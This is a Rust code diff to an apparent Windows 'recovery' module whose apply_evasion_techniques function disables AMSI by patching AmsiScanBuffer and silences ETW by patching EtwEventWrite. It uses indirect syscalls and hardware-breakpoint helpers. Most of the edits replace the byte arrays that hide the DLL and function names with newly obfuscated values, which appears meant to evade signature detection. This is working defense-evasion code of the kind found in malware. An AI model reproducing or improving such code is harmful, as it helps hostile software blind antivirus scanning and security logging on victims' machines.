@@ -7,8 +7,8 @@ use windows::Win32::System::Memory::{
 };
 use windows::core::PCWSTR;
 
-use crate::recovery::helpers::syscalls::{SyscallManager, indirect_syscall_5};
 use crate::recovery::helpers::hw_breakpoints::enable_hw_breakpoint;
+use crate::recovery::helpers::syscalls::{SyscallManager, indirect_syscall_5};
 
 pub fn apply_evasion_techniques() {
     if !RecoveryControl::global().evasion_enabled() {
@@ -42,7 +42,7 @@ pub fn apply_evasion_techniques() {
 fn bypass_amsi() -> Result<(), Box<dyn std::error::Error>> {
     unsafe {
         // "amsi.dll"
-        let amsi_name = deobf_w(&[0xDC, 0xD0, 0xCE, 0xD4, 0x93, 0xD9, 0xD1, 0xD1]);
+        let amsi_name = deobf_w(&[0xBF, 0x45, 0xB8, 0x1C, 0x6E, 0x0E, 0x1F, 0x70]);
         let h_amsi = LoadLibraryW(PCWSTR(amsi_name.as_ptr()))?;
         if h_amsi.is_invalid() {
             return Err("failed to load amsi.dll".into());
@@ -50,7 +50,7 @@ fn bypass_amsi() -> Result<(), Box<dyn std::error::Error>> {
 
         // "AmsiScanBuffer"
         let func_name_str = deobf(&[
-            0xFC, 0xD0, 0xCE, 0xD4, 0xEE, 0xDE, 0xDC, 0xD3, 0xFF, 0xC8, 0xDB, 0xDB, 0xD8, 0xCF,
+            0x9F, 0x45, 0xB8, 0x1C, 0x3C, 0x2E, 0x58, 0x71, 0x7B, 0x4A, 0xF7, 0xFA, 0x12, 0x12,
         ]);
         let func_name = format!("{}\0", func_name_str);
         let p_amsi_scan_buffer = GetProcAddress(h_amsi, windows::core::PCSTR(func_name.as_ptr()));
@@ -70,7 +70,7 @@ fn bypass_amsi() -> Result<(), Box<dyn std::error::Error>> {
 fn patch_etw(syscalls: Option<&SyscallManager>) -> Result<(), Box<dyn std::error::Error>> {
     unsafe {
         // "ntdll.dll"
-        let ntdll_name = deobf_w(&[0xD3, 0xC9, 0xD9, 0xD1, 0xD1, 0x93, 0xD9, 0xD1, 0xD1]);
+        let ntdll_name = deobf_w(&[0xB0, 0x5B, 0x77, 0xE3, 0x42, 0xD4, 0x19, 0x70, 0xA5]);
         let h_ntdll = LoadLibraryW(PCWSTR(ntdll_name.as_ptr()))?;
         if h_ntdll.is_invalid() {
             return Err("failed to load ntdll.dll".into());
@@ -78,7 +78,7 @@ fn patch_etw(syscalls: Option<&SyscallManager>) -> Result<(), Box<dyn std::error
 
         // "EtwEventWrite"
         let func_name_str = deobf(&[
-            0xF8, 0xC9, 0xCA, 0xF8, 0xCB, 0xD8, 0xD3, 0xC9, 0xEA, 0xCF, 0xD4, 0xC9, 0xD8,
+            0x9B, 0x5B, 0xA8, 0x3D, 0xE3, 0xEF, 0x9C, 0x6C, 0x8E, 0x40, 0xFB, 0x69, 0x12,
         ]);
         let func_name = format!("{}\0", func_name_str);
         let p_etw_event_write = GetProcAddress(h_ntdll, windows::core::PCSTR(func_name.as_ptr()));
@@ -114,7 +114,9 @@ fn apply_patch(
                 &mut old_protect.0 as *mut _ as isize,
             );
             if status != 0 {
-                return Err(format!("NtProtectVirtualMemory failed with status 0x{:X}", status).into());
+                return Err(
+                    format!("NtProtectVirtualMemory failed with status 0x{:X}", status).into(),
+                );
             }
         } else {
             VirtualProtect(
@@ -145,4 +147,3 @@ fn apply_patch(
         Ok(())
     }
 }
-
